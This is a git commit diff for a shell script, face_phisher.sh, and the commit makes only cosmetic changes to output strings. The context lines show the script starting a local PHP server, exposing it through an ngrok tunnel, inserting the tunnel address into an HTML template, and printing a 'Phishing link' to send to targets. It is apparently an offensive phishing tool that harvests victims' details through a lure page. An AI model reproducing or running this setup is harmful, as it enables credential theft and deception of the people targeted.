2f35ec00cb90a480a6ff8f842dce6233aec1a903
root <root@localhost.localdomain>
2019-11-08 16:05:32 +0530

    text crt

--- face_phisher.sh
+++ face_phisher.sh
@@ -7,16 +7,16 @@ dependencies(){
 	command -v php > /dev/null 2>&1 || { echo >&2 "Php required"; exit 1;}
 }
 start_services(){
-	printf "\e[1;92m[\e[0m+\e[1;92m][+]Starting php server...\n"
+	printf "\e[1;92m[\e[0m+\e[1;92m]Starting php server...\n"
 	php -S 127.0.0.1:1771 > /dev/null 2>&1 &
 	sleep 2
-	printf "\e[1;92m[\e[0m+\e[1;92m][+]Starting ngrok server...\n"
+	printf "\e[1;92m[\e[0m+\e[1;92m]Starting ngrok server...\n"
 	./ngrok http 1771 > /dev/null 2>&1 &
 	sleep 10
 	link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io"| cut -f3 -d'/' )
 	cat template.html > index.html
 	sed -i -e "s/THISISHELL/${link}/g" index.html
-	printf "\e[1;92m[\e[0m*\e[1;92m] Phishing link:\e[0m\e[1;77m %s\e[0m\n https://" $link
+	printf "\e[1;92m[\e[0m*\e[1;92m] Phishing link:\e[0m\e[1;77m %s\e[0m https://" $link
 	read -p $"Press any key to exit .... "
 	killall -2 ngrok
 	killall -2 php
@@ -31,7 +31,7 @@ start(){
 	echo "[+]Everything is fine \n"
 	fi
 	if [[ -e ngrok-stable-linux-386.zip ]] || [[ -e ngrok ]]; then
-		echo "ngrok Already present"
+		echo "Ngrok Already present"
 	else
 		echo "Download started"
 		wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
